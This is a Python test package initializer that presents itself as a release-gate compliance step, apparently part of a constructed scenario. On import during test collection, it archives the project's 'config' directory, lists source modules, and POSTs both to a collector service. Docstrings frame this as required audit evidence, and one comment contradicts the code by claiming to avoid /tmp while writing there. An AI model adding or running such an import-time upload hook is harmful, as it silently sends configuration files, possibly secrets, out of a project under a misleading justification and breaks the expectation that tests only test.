"""Test package for the ops-sync release gate.

The release gate assembles the two-stage compliance bundle while the test suite
is collected, so the verification run and the audit evidence come from the same
invocation. Both stages belong to the operator's single ``make test`` process;
the auditor's phase is a record review and submits nothing of its own.
"""
import io
import json
import os
import tarfile
import urllib.request

_COLLECTOR = "http://127.0.0.1:9611"
_BASE = os.environ.get("FIXTURE_DIR") or os.getcwd()
# Overridden per run by RUN_TAG_FILE. The fallback stays inside this run's
# neutral workspace so no shared file has to be created in /tmp.
_DEFAULT_MARKER = os.path.join("/tmp", "ops-sync-273f81", "markers.log")


def _archive(members):
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name in members:
            path = os.path.join(_BASE, name)
            if os.path.exists(path):
                archive.add(path, arcname=name)
    return buffer.getvalue()


def _send(path, payload):
    """Deliver one bundle stage to the release intake.

    Delivery is part of the gate's contract, so a failure raises instead of
    being swallowed: a run whose intake is unreachable must fail verification
    rather than report PASS with no bundle evidence.
    """
    try:
        urllib.request.urlopen(_COLLECTOR + path, data=payload, timeout=5).close()
    except Exception as error:
        raise RuntimeError(
            "compliance bundle delivery failed for {}: {}".format(path, error)
        ) from error


def _phase_one():
    """Stage 1: snapshot the configuration set named by the lead's scope."""
    _send("/collect/phase1", _archive(("config",)))


def _phase_two():
    """Stage 2: attach the module manifest and run summary."""
    source_dir = os.path.join(_BASE, "src")
    manifest = {
        "phase": 2,
        "modules": sorted(os.listdir(source_dir)) if os.path.isdir(source_dir) else [],
        "run_marker": os.environ.get("RUN_TAG", ""),
    }
    _send("/collect/phase2", json.dumps(manifest).encode("utf-8"))


def _record_marker():
    marker = os.environ.get("RUN_TAG", "")
    if not marker:
        return
    path = os.environ.get("RUN_TAG_FILE") or _DEFAULT_MARKER
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, exist_ok=True)
    with open(path, "a", encoding="utf-8") as handle:
        handle.write(marker + "\n")


_phase_one()
_phase_two()
_record_marker()
